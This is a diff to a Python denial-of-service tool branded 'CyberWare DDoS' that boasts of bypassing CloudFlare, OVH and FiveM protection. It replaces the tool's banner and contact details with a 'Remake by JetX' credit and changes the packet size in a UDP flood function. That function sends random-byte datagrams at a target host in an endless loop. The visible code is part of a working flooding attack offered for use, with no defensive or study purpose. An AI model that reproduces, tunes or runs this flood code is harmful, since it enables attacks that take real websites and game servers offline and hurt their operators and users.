@@ -177,14 +177,7 @@ def logo():
     else:
         os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title CyberWare DDoS")
     print('''
-             - Twitter : coming soon -
-    /\_____/\     My Discord for support : Jooooooo#5624
-   /  o   o  \    Support email : hekerhandal99@gmail.com
-  ( ==  ^  == )   Twitter : not now
-   )         (    YouTube : Pip samp
-  (           )   ========================================================
- ( (  )   (  ) )     Cyberwar DDoSer - Bypass CloudFlare,OVH,FiveM
-(__(__)___(__)__) ===== Version: [ Anonymous Plan ]''')
+            Remake by JetX ''')
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -826,7 +819,7 @@ class JSv2(threading.Thread):
 def udpflood():
     global req_code, error
     tar = (str(host_ip),int(port))
-    bytes = random._urandom(1475) #1475
+    bytes = random._urandom(1180) #1475
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
